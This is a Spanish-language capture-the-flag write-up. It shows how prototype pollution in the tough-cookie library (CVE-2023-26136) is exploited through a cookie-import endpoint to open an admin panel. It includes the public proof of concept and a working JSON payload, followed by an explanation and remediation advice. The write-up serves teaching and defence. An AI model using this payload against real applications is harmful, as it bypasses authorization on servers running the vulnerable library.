# Desafío 55 - Cookie envenenada

**Plataforma:** HackLab (SoftwareSeguro)

**Edición:** HackingDay 2026

**Categoría:** CVE

## Enunciado
CookieLab publicó un "validador de cookies": pegás tus cookies crudas y el servicio te dice cuáles quedarían guardadas en su jar. Suena inofensivo... pero el panel de administración (/admin) empezó a abrirse solo para algunos visitantes, sin que nadie les diera permisos.

Tu objetivo es entrar a /admin y llevarte la flag.

Raíz del servicio: `chl-0cbeee2d-190d-4845-bbf7-d3fc4f23b5af-cookie-envenenada.softwareseguro.com.ar`

## Reconocimiento
La raíz del challenge documenta dos endpoints:

```
POST /cookies/import
  Content-Type: application/json
  body: { "cookies": ["nombre=valor; Domain=...; Path=..."], "url": "http://..." }

GET  /admin
  Panel de administracion. Requiere permisos sobre la ruta solicitada.
```

Y `/admin`, sin más, responde 403:

```json
{"error":"Acceso denegado: no tenés permisos sobre /admin"}
```

### POST /cookies/import
Algunas observaciones sobre el comportamiento de `/cookies/import`:
- Recibe un array `cookies` donde cada elemento es una cookie cruda estilo Set-Cookie, y un campo `url`. Devuelve en `stored` las cookies que "quedarían guardadas".
- Reconstruye la cookie en un orden canónico: `<nombre>=<valor>; Domain=...; Path=/; [otros atributos]`.
  - Reconoce los atributos estándar (Domain, Path, Expires, Secure, HttpOnly, SameSite) y los reproduce en ese orden.
  - Inyecta `Path=/` por defecto cuando no se especifica.
  - Preserva como par final cualquier clave que no reconoce.
- Se rompe ante entradas malformadas (saltos de línea, atributos duplicados).

### Validación del Domain
Fuzzeando el atributo `Domain` (con el `url` fijo apuntando al host del reto) se ve qué dominios acepta el validador:

Domain | ¿Aceptado?
--- | ---
softwareseguro.com.ar | ✅
.softwareseguro.com.ar | ✅
chl-...-cookie-envenenada.softwareseguro.com.ar (host exacto) | ✅
com.ar | ✅
evil.softwareseguro.com.ar | ❌
softwareseguro.com.ar.evil.com | ❌
notsoftwareseguro.com.ar | ❌
softwareseguro.com.ar. | ❌

El `Domain` se valida como sufijo del host real, cortando por puntos (matching estilo RFC 6265). Los trucos ingenuos (includes/endsWith, evil.com conteniendo la cadena legítima) se rechazan.

El dato llamativo: acepta `com.ar`, que es un public suffix y normalmente se rechazaría. Esa es la primera huella de la configuración vulnerable.

## De "parser casero" a librería conocida
El giro es dejar de modelar `/cookies/import` como lógica a medida y reconocer que ese comportamiento es el de una librería estándar. Las señales:
- El enunciado usa la palabra "jar" literalmente.
- El header de respuesta `X-Powered-By: Express` → stack Node.js, donde las dependencias con CVE son habituales.
- El parser es demasiado estándar para ser casero: reordenar atributos, inyectar Path, descartar Expires, mantener domain-matching por sufijo. Eso no se escribe a mano para un reto; se obtiene de una lib.
- La librería de referencia para cookies y jars en Node es `tough-cookie`. El `POST /cookies/import` es por dentro un `jar.setCookie(string, url)`.

Buscando CVEs de esa librería se llega a CVE-2023-26136.

## CVE-2023-26136 — Prototype Pollution en tough-cookie
- Afecta: `tough-cookie` < 4.1.3
- Condición: el jar corre con `rejectPublicSuffixes: false`
- Causa raíz: el memstore indexa las cookies en un objeto literal `{}` en vez de `Object.create(null)`. La estructura es `idx[domain][path][name] = cookie`. Si el Domain es `__proto__`, acceder a `idx["__proto__"]` devuelve `Object.prototype`, y el nivel siguiente (el Path) se escribe como clave ahí, contaminando el prototipo.

El PoC oficial:
```js
const jar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });
jar.setCookieSync(
  "Slonser=polluted; Domain=__proto__; Path=/notauth", 
  "https://__proto__/admin"
);
```

El detalle clave: `__proto__` aparece en dos lugares — en el `Domain` de la cookie y en el host del `url`. Eso es lo que hace que el domain-match (`__proto__` == `__proto__`) pase, y la escritura llegue al memstore vulnerable.

Es el `Path` el que termina siendo la clave contaminada en `Object.prototype`: con `Path=/notauth`, `objeto["/notauth"]` queda truthy para todo objeto.

## Explotación
Traduciendo el PoC al formato del endpoint (array `cookies`, `url` por separado):

```json
{"cookies":["Slonser=polluted; Domain=__proto__; Path=/admin"],"url":"https://__proto__/admin"}
```

El `stored` sale no vacío (el `Domain=__proto__` fue aceptado porque el `url` también es `__proto__`), confirmando que el vector entró.

Acto seguido, un `GET /admin` (sin ninguna cookie especial) ya devuelve la flag:

```json
{"ok":true,"message":"Permisos verificados. Bienvenido, administrador.","flag":"af41d36d3f3eca7f62a8d17e628e0f7a"}
```

## Por qué funciona el payload
En JavaScript, casi todo objeto hereda de `Object.prototype`. `const obj = {}` apunta a `Object.prototype` como padre, y ese padre es el mismo objeto en memoria para todos.

Cuando se lee `obj["/admin"]`, el motor busca:
1. ¿`obj` tiene una propiedad propia `/admin`? → si sí, la devuelve
2. Si no → busca en el prototipo (`Object.prototype`)
3. Si tampoco → `undefined`

El paso 2 consulta un objeto compartido por todos.

El bug permite escribir `Object.prototype["/admin"] = <algo truthy>`. A partir de ahí, un objeto vacío responde distinto sin haber sido modificado:

```js
const permisos = {};       // objeto vacío, SIN propiedades propias
permisos["/admin"]         // propia: no → prototipo: ¡SÍ ahora! → devuelve truthy  
```

`permisos` sigue siendo `{}`; lo que cambió es su padre. Como ese padre lo comparten todos los objetos, todos "heredan" la clave `/admin`.

Aplicado al challenge, el código de `/admin` evalúa algo así:

```js
const permisos = construirPermisos(req);   // devuelve {} u objeto normal
if (permisos["/admin"]) { /* flag */ } else { /* 403 */ }
```

Antes del payload, `permisos["/admin"]` daba `undefined` (propia y prototipo no) → 403.
Después, `Object.prototype["/admin"]` quedó contaminado → el lookup lo hereda → truthy → flag.

Esto explica la frase "se abre solo para algunos visitantes": la contaminación es global al proceso Node. Una vez disparada, cualquier request que construya un objeto y consulte `["/admin"]` hereda el permiso, hasta que el servidor se reinicie.

## Enfoques descartados
El camino hasta el CVE pasó por descartar varias hipótesis:

Hipótesis | Descarte
--- | ---
`/admin` lee una cookie de permiso | Fuzzear con `admin=true`, `role=admin` y ~300 variantes más: respuesta 403 idéntica siempre. El endpoint ignora las cookies.
El `/import` guarda estado (jar persistente) | Importar `aaa=...` y luego `bbb=...`: el segundo `stored` trae solo `bbb`. El import es una función pura, no acumula.
El `url` filtra el `stored` | Repetir las mismas cookies cambiando solo el `url`: `stored` idéntico. El `url` es decorativo para el filtro (pero crítico para el domain-match).
El `Domain` se puede falsificar | Fuzzear con `evil.com`, `softwareseguro.com.ar.evil.com`: todos rechazados. El matching por sufijo está bien hecho.

La clave: la combinación stack conocido (Express + "jar") + comportamiento estándar + fuzzing lógico que no cede es la señal para buscar un CVE, en lugar de seguir modelando la lógica como a medida.

## Remediación
- Actualizar la dependencia: `tough-cookie` >= 4.1.3, que arregla el vector.
- No usar `rejectPublicSuffixes: false` salvo necesidad real; es el modo que habilita el bug.
- No parsear cookies de terceros directo con el jar del server sin aislar.
- Defensa en profundidad: usar `Object.hasOwn(permisos, ruta)` en vez de `if (permisos[ruta])` para chequeos de autorización.
